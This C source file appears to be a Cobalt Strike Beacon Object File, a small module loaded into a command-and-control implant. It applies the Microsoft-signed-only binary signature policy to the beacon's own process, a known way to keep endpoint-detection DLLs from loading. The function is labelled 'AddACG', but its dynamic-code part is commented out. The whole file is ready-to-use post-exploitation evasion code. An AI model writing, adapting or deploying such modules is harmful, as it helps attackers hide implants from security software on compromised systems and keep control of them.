#include <windows.h>
#include "beacon.h"

#define intZeroMemory(addr,size) MSVCRT$memset((addr),0,size)

DECLSPEC_IMPORT WINBASEAPI void __cdecl MSVCRT$memset(void *dest, int c, size_t count);

typedef struct _PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY {
  union {
    DWORD Flags;
    struct {
      DWORD MicrosoftSignedOnly : 1;
      DWORD StoreSignedOnly : 1;
      DWORD MitigationOptIn : 1;
      DWORD AuditMicrosoftSignedOnly : 1;
      DWORD AuditStoreSignedOnly : 1;
      DWORD ReservedFlags : 27;
    } DUMMYSTRUCTNAME;
  } DUMMYUNIONNAME;
} PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY, *PPROCESS_MITIGATION_BINARY_SIGNATURE_POLICY;

/*
typedef struct _PROCESS_MITIGATION_DYNAMIC_CODE_POLICY {
  union {
    DWORD Flags;
    struct {
      DWORD ProhibitDynamicCode : 1;
      DWORD AllowThreadOptOut : 1;
      DWORD AllowRemoteDowngrade : 1;
      DWORD AuditProhibitDynamicCode : 1;
      DWORD ReservedFlags : 28;
    } DUMMYSTRUCTNAME;
  } DUMMYUNIONNAME;
} PROCESS_MITIGATION_DYNAMIC_CODE_POLICY, *PPROCESS_MITIGATION_DYNAMIC_CODE_POLICY;

PROCESS_MITIGATION_POLICY ProcessDynamicCodePolicy = 2;
*/

PROCESS_MITIGATION_POLICY ProcessSignaturePolicy = 8;

WINBASEAPI HANDLE WINAPI KERNEL32$SetProcessMitigationPolicy(PROCESS_MITIGATION_POLICY MitigationPolicy,PVOID           lpBuffer,SIZE_T  dwLength);

WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessMitigationPolicy(HANDLE hProcess, PROCESS_MITIGATION_POLICY MitigationPolicy, PVOID lpBuffer, SIZE_T  dwLength);


void AddACG(){
		PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY signature = { 0 };
		intZeroMemory(&signature, sizeof(signature));

		KERNEL32$GetProcessMitigationPolicy((HANDLE)(-1), (PROCESS_MITIGATION_POLICY)ProcessSignaturePolicy, &signature, sizeof(signature));

		signature.MicrosoftSignedOnly = 1;


		KERNEL32$SetProcessMitigationPolicy((PROCESS_MITIGATION_POLICY)ProcessSignaturePolicy, &signature, sizeof(signature));

		BeaconPrintf(CALLBACK_OUTPUT, "[+] Add ACG!");


		/*
		PROCESS_MITIGATION_DYNAMIC_CODE_POLICY policy;
		intZeroMemory(&policy, sizeof(policy));
		policy.ProhibitDynamicCode = 1;

		PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY signature = { 0 };
		intZeroMemory(&signature, sizeof(signature));

		KERNEL32$GetProcessMitigationPolicy((HANDLE)(-1), (PROCESS_MITIGATION_POLICY)ProcessSignaturePolicy, &signature, sizeof(signature));

		signature.MicrosoftSignedOnly = 1;



		KERNEL32$SetProcessMitigationPolicy((PROCESS_MITIGATION_POLICY)ProcessSignaturePolicy, &signature, sizeof(signature));

		KERNEL32$SetProcessMitigationPolicy((PROCESS_MITIGATION_POLICY)ProcessDynamicCodePolicy, &policy, sizeof(policy));

		BeaconPrintf(CALLBACK_OUTPUT, "[+] Add ACG!");
		*/

	

}

void go(char* args, int len)
{
    AddACG();
}
